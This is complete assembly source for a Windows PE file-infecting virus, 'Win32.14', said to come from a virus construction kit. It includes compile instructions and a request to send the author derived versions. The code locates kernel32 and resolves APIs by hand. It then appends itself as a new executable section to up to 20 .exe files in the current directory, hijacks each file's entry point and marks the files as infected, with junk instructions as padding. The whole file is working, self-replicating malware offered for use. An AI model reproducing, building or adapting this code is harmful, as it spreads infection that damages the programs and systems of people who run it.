              
;
;
; Win32.14 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.14
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 14
;  Infection Type         : adding a new section 
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 39
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebx
 sub ebx, offset Delta
                                        ; mov ebp, ebx
 mov ebp, ebx
 jmp KernelSearchStart


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 sub edx, edx
 mov eax, dword ptr [ebp+AlignReg1]
 push eax
 div ecx
 sub ecx, edx
 pop eax
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Lenght of API-Name
                                        ; esi Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 push dword ptr [ebp+NTableVA]
 pop ecx


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], ecx
                                        ; mov edx, -1
 mov edx, ( -1d xor 6d )
 xor edx, 6d
 and edx, dword ptr [ebp+KernelMZ]
 add edx, dword ptr [ecx]
                                        ; mov ecx, edx
                                        ; clear ecx
 mov ecx, -31034d
 add ecx, 31034d
 add ecx, edx
                                        ; mov edi, ecx
                                        ; clear edi
 mov edi, -23215d
 add edi, 23215d
 add edi, ecx
 mov dword ptr [ebp+TempApisearch1], -1
 and dword ptr [ebp+TempApisearch1], eax
 mov dword ptr [ebp+TempApisearch2], -1
 and dword ptr [ebp+TempApisearch2], edi
 push esi
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; esi Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov dl, byte ptr [edi]
 cmp dl, byte ptr [esi]
 jne ApiNotFound
 sub eax, 1
 dec eax
 add eax, 1
 jz FoundApi1
                                        ; add edi, 1
 add edi, 1d
 sub dword ptr [ebp+Trash1], ebx        ; Trash
                                        ; add esi, 1
 inc esi
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop esi
 mov eax, dword ptr [ebp+TempApisearch1]
 push dword ptr [ebp+NTableTemp]
 pop ecx
 mov edi, dword ptr [ebp+TempApisearch2]
                                        ; add ecx, 4
 dec ecx
 add ecx, 5d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
                                        ; retrieve the offset
                                        ; clear ecx
 mov ecx, -28855d
 add ecx, 28855d
 mov cx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 mov edx, ecx
 movzx ecx, word ptr [edx]
 clc
 rcl ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov edx, dword ptr [ecx]
 add edx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], edx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ebx
 popad
 jmp ExecuteHost



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldBase]
 and dword ptr [ebp+Trash1], 957973     ; Trash
 pop esi

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], esi

 mov edi, dword ptr [ebp+OldEIP]

 push edi
 pop dword ptr [ebp+retEIP]



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov eax,12345678h
 org $-4
 retBase dd 0h
 add eax,12345678h
 org $-4
 retEIP dd 0h
 push eax
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; mov edi, -1
 mov edi, -1d
 and edi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, edi
 add esi, [edi+3Ch]
                                        ; get File Alignment
                                        ; add esi, 60
 add esi, 60d
 mov eax, [esi]
 inc esi
 sub esi, 61d
 mov dword ptr [ebp+filealign], -1
 and dword ptr [ebp+filealign], eax
                                        ; clear esi
 sub esi, esi
 xor esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edx, dword ptr [esi+3Ch]
 add edx, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], edx
                                        ; get old Entrypoint
 mov ecx, dword ptr [edx+28h]
 mov dword ptr [ebp+OldEIP], ecx
 mov ebx, dword ptr [edx+34h]
 mov dword ptr [ebp+OldBase], ebx
 mov ecx, [edx+38h]
 mov dword ptr [ebp+sectionalign], ecx
                                        ; Get last section
 mov ebx, [edx+74h]
 shl ebx, 3
                                        ; clear eax
 mov eax, 0
 mov ax, word ptr [edx+6h]
 mov ecx, 28h
 pushad
 mov eax, eax
 mul ecx
 mov dword ptr [ebp+Misc1], 0
 xor dword ptr [ebp+Misc1], eax
 popad
 mov eax, dword ptr [ebp+Misc1]
 add edx, 78h
 add edx, ebx
 add edx, eax
 lea ebx, [ebp+newsection]
 xchg ecx, ebx


 xchg ecx, edx
 push ecx
                                        ; Calculate the RVA of the new section
 mov edx, [ecx-5*8+8d]
 add edx, [ecx-5*8+12d]
 mov eax, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], edx
 mov dword ptr [ebp+AlignReg2], eax
 mov dword ptr [ebp+nsphysicalsize], 0
 add dword ptr [ebp+nsphysicalsize], edx
 Call Align
                                        ; clear eax
 and eax, 0
 add eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], eax
                                        ;  calculate the virtual size of the new section
 mov edx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], edx
 Call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], ebx
                                        ; calculate physical offset
 mov ebx,[ecx-5*8+20d]
 add ebx,[ecx-5*8+16d]
 mov edx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], ebx
 push edx
 pop dword ptr [ebp+AlignReg2]
 Call Align
                                        ; clear ebx
 and ebx, 0
 add ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], ebx
                                        ; calculate new size
 mov edx, dword ptr [ebp+filealign]
 mov ecx, ebx
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], edx
 call Align
 mov ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
                                        ; mov ecx, 64
 push 64d
 pop ecx
 pop eax
 lea edi, [ebp+newsection]
 xchg ebx, edi

WriteNewSectionLoop:
 mov dl, byte ptr [ebx]
 mov byte ptr [eax], dl
                                        ; add ebx, 1
 add ebx, 1d
                                        ; add eax, 1
 add eax, 1d
 loop WriteNewSectionLoop
                                        ; increase section numbers
                                        ; mov ecx, -1
 mov ecx, ( -1d + 30d )
 sub ecx, 30d
 and ecx, dword ptr [ebp+PEheader]
 inc word ptr [ecx+06h]
 push dword ptr [ebp+nsRVA]
 pop eax
 mov dword ptr [ebp+NewEIP], eax
                                        ; set new EIP
 mov dword ptr  [ecx+28h], eax
                                        ; set infection mark
 mov dword ptr [ecx+4Ch], '14'
 mov ecx, dword ptr [ebp+nsphysicaloffset]
 push ecx
                                        ; Append Virus
 pop edi
 lea esi, [ebp+Virus]

 add edi, dword ptr [ebp+MapAddress]
 mov ecx, VirusSize

AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
 push dword ptr [ebp+InfCounter]
 pop ebx
 add ebx, -1
 mov dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 pop ebx
 stc
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]

 mov ebx, ebx                           ; Trash

Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 push 20d
 pop dword ptr [ebp+InfCounter]
 lea eax, [ebp+filemask]
 or ebx, ebx                            ; Trash
 xchg ecx, eax

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 rcl ebx, 6d                            ; Trash
 call InfectFile
                                        ; Check Infection Counter
 mov ecx, dword ptr [ebp+InfCounter]
 dec ecx
 add ecx, 1
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost
 xor dword ptr [ebp+Trash1], eax        ; Trash


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop esi
 push esi
                                        ; round to pages
 xor si, si
                                        ; add esi, 1
 add esi, 1d
GetKernelLoop:
                                        ; clear edx
 and edx, 0
 add esi, -1
 mov dx, word ptr [esi+03ch]
 test dx,0f800h
 jnz GetKernelLoop
 cmp esi, dword ptr [esi+edx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], esi
 mov edx, [esi+3Ch]
 add edx, esi
 mov [KernelPE+ebp], edx

 jmp GetApis

;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

                                        ; store old EIP and ImageBase
                                        ; mov eax, -1
 push -1d
 pop eax
 and eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], eax

 push dword ptr [ebp+OldBase]
 pop edi

 rcl ecx, 19d                           ; Trash
 mov dword ptr [ebp+retBase], edi



                                        ; number of API's we're looking for
                                        ; clear edx
 mov edx, -12008d
 add edx, 12008d
 add edx, NumberOfApis
                                        ; clear ecx
 xor ecx, ecx
 add ecx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear eax
 mov eax, 8693d
 sub eax, 8693d
 add eax, [ecx+78h]
 add eax, [ebp+KernelMZ]
                                        ; add eax, 28
 add eax, 28d
                                        ; get ATableVA
 mov ecx, dword ptr [eax]
 add ecx, [ebp+KernelMZ]
                                        ; add eax, 4
 dec eax
 add eax, 5d
 mov dword ptr [ebp+ATableVA], ecx
                                        ; get NTableVA
 mov ecx, dword ptr [eax]
                                        ; add eax, 4
 add eax, 4d
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ecx
                                        ; get OTableVA
 mov ecx, dword ptr [eax]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ecx
                                        ; load API Names and Offsets
 lea ecx, [ebp+APINames]
 xchg esi, ecx

 mov ebx, ebp
 xor dword ptr [ebp+Trash1], 1125445    ; Trash
 add ebx, offset APIOffsets


GetApisLoop: 

 mov eax, esi
APINameDetect:                          ; calculate the lenght of the names
 inc eax
 cmp byte ptr [eax], 0
 jne APINameDetect
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

 push eax
 sub dword ptr [esp], esi
 pop eax
                                        ; search 'em
                                        ; eax contains Name-Lenght
                                        ; esi points to the Name
                                        ; ebx points to the offset

 call SearchAPI1
                                        ; add esi, 1
 add esi, 1d
 push esi
 add dword ptr [esp], eax
 pop esi
                                        ; mov ecx, -1
 mov ecx, 0
 add ecx, -1d
 and ecx, dword ptr [ebp+TempAPI]
 mov dword ptr [ebx], -1
 and dword ptr [ebx], ecx
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 dec edx
 jnz GetApisLoop
 jmp Outbreak



;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg esi, ebx

 push esi
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov eax, 276
 push 276d
 pop eax
 lea ebx, [ebp+WFD_szFileName]


ClearOldData2:
 mov byte ptr [ebx], 0h
                                        ; add ebx, 1
 sub ebx, -1d
 dec eax
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg edx, ebx

 push edx
 push ecx
 sar ebx, 25d                           ; Trash
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret





;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
                                        ; mov eax, -1
 mov eax, ( -1d xor 30d )
 xor eax, 30d
 and eax, dword ptr [ebp+WFD_nFileSizeLow]
 cmp eax, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov edx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edx], 'ZM'
 je Goodfile
                                        ; mov ecx, 7044
 mov ecx, ( 7044d - 6d )
 add ecx, 6d
 cmp ecx, 7044d
 je Notagoodfile

Goodfile:
 cmp word ptr [edx+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 push dword ptr [edx+3Ch]
 pop eax
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],eax
 jb Notagoodfile
 add eax, edx
                                        ; check for PE Header
                                        ; check for EP
 movzx ebx, word ptr [eax]
 cmp ebx, 'EP'
 je Goodfile2
                                        ; clear ecx
 push 0
 pop ecx
 test ecx, ecx
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [eax+4Ch], '14'
 jz Notagoodfile
                                        ; check for OBJ
 mov cx, word ptr [eax+16h]
 and cx, 00002h
 cmp cx, 00002h
 jne Notagoodfile
                                        ; check for DLL
 mov cx, word ptr [eax+16h]
 and cx, 0F000h
 cmp cx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;                  [ ///// * Data * \\\\\ ]

Data:
 AlignReg2   dd 0h
 Misc1       dd 0h
 PEheader    dd 0h
 counter     dw 0h
 NewEIP      dd 0h
 AlignReg1   dd 0h
 TempApisearch2 dd 0h
 OTableVA    dd 0h
 FindHandle  dd 0h
 MapHandle   dd 0h

 APINames:
 db 'UnmapViewOfFile', 0
 db 'FindFirstFileA', 0
 db 'FindClose', 0
 db 'MapViewOfFile', 0
 db 'CreateFileMappingA', 0
 db 'CreateFileA', 0
 db 'FindNextFileA', 0
 db 'CloseHandle', 0

 OldBase     dd 400000h
 KernelPE    dd 0h
 filealign   dd 0h

 APIOffsets:
 XUnmapViewOfFile       dd 0h
 XFindFirstFileA        dd 0h
 XFindClose             dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileMappingA    dd 0h
 XCreateFileA           dd 0h
 XFindNextFileA         dd 0h
 XCloseHandle           dd 0h

 TempAPI     dd 0h
 FileHandle  dd 0h
 filemask    db '*.ExE',0
 TempApisearch1 dd 0h
 MapAddress  dd 0h
 ATableVA    dd 0h

newsection:                           ; Settings for the new section
 nsname           db '.NGVCKvx'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 sectionalign   dd 0h
 KernelMZ    dd 0h
 OldEIP      dd 0h
 NTableTemp  dd 0h
 InfCounter  dd 0h
 db 'Win32.14 - SnakeByte',0
 Trash1      dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 NTableVA    dd 0h
 NewSize     dd 0h




;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov eax, 80000000h or 40000000h
 push eax
 lea edi, [ebp+WFD_szFileName]

 push edi
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx

                                        ; clear ebx
 and ebx, 0
 push ebx
 push edx
 push ebx
 push 00000004h
 push ebx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop edx
                                        ; add eax, 1
 inc eax
 dec eax
 jz CloseFile
 push edx
 push 0
 push 0
                                        ; mov ebx, 2
 push 2d
 pop ebx
 push ebx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 add ebx, 2550166d                      ; Trash
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 adc ebx, 18628406d                     ; Trash
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ecx
 and ecx, 0
 push ecx
 call ExitProcess



end FakeCode

